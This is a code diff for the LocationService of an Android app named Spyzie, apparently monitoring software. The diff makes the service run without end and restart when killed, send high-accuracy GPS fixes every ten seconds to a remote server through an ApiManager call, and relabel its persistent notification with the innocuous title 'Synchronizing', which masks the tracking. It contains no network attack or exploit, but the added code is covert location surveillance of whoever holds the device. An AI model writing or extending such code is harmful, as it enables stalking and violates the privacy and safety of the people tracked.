@@ -25,62 +25,73 @@ import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
 import com.tantd.spyzie.R;
+import com.tantd.spyzie.SpyzieApplication;
+import com.tantd.spyzie.data.network.ApiManager;
 import com.tantd.spyzie.util.Constants;
+
+import javax.inject.Inject;
 
 public class LocationService extends Service {
 
     public static final String CHANNEL_ID = "ForegroundServiceChannel";
 
-    private FusedLocationProviderClient mLocationProviderClient;
-    private LocationCallback mLocationCallback = new LocationCallback() {
+    @Inject
+    ApiManager mApiManager;
 
-        @Override
-        public void onLocationResult(LocationResult locationResult) {
-            Location location = locationResult.getLastLocation();
-            if (location != null) {
-                Log.d(Constants.LOG_TAG, "requestLocationUpdates, lat=" + location.getLatitude() + ", lon=" + location.getLongitude());
-            }
-        }
-    };
+    private static final int UPDATE_INTERVAL = 10 * 1000;
+    private static final int FASTEST_UPDATE_INTERVAL = 10 * 1000;
+    private static final int CONDITION_CHECKING_INTERVAL = 5 * 1000;
+
+    private FusedLocationProviderClient mLocationProviderClient;
+    private LocationCallback mLocationCallback;
 
     @Override
     public void onCreate() {
+        SpyzieApplication.getInstance().getAppComponent().inject(this);
         super.onCreate();
-        Log.d(Constants.LOG_TAG, "onCreate()");
+        Log.d(Constants.LOG_TAG, "[LocationService] onCreate()");
         mLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);
+        mLocationCallback = new LocationCallback() {
+
+            @Override
+            public void onLocationResult(LocationResult locationResult) {
+                Location location = locationResult.getLastLocation();
+                if (location != null) {
+                    mApiManager.sendLocationData(location);
+                }
+            }
+        };
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(Constants.LOG_TAG, "onStartCommand()");
-        String input = intent.getStringExtra("input");
         createNotificationChannelForAndroidO();
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Foreground Service")
-                .setContentText(input)
+                .setContentTitle("Synchronizing")
                 .setSmallIcon(R.drawable.ic_stat_name)
                 .build();
 
         new Thread(() -> {
-            for (int i = 0; i < 20; i++) {
+            while (true) {
                 if (checkPermissions() && isLocationTurnOn()) {
-                    Log.d(Constants.LOG_TAG, "i=" + i + " foreground");
+                    Log.d(Constants.LOG_TAG, "[LocationService] foreground");
                     startForeground(1, notification);
                     requestLocationUpdates();
                 } else {
-                    Log.d(Constants.LOG_TAG, "i=" + i + " remove foreground");
+                    Log.d(Constants.LOG_TAG, "[LocationService] remove foreground");
                     removeLocationUpdates();
                     stopForeground(true);
                 }
                 try {
-                    Thread.sleep(5000);
+                    Thread.sleep(CONDITION_CHECKING_INTERVAL);
                 } catch (InterruptedException e) {
                     e.printStackTrace();
                 }
             }
-            removeLocationUpdates();
-            stopSelf();
+//            removeLocationUpdates();
+//            stopSelf();
         }).start();
 
         return START_STICKY;
@@ -88,7 +99,7 @@ public class LocationService extends Service {
 
     @Override
     public void onDestroy() {
-        Log.d(Constants.LOG_TAG, "onDestroy()");
+        Log.d(Constants.LOG_TAG, "[LocationService] onDestroy()");
         super.onDestroy();
     }
 
@@ -125,8 +136,8 @@ public class LocationService extends Service {
     private void requestLocationUpdates() {
         LocationRequest locationRequest = new LocationRequest();
         locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
-        locationRequest.setInterval(10 * 1000);
-        locationRequest.setFastestInterval(10 * 1000);
+        locationRequest.setInterval(UPDATE_INTERVAL);
+        locationRequest.setFastestInterval(FASTEST_UPDATE_INTERVAL);
         mLocationProviderClient.requestLocationUpdates(locationRequest, mLocationCallback, Looper.getMainLooper());
     }
 
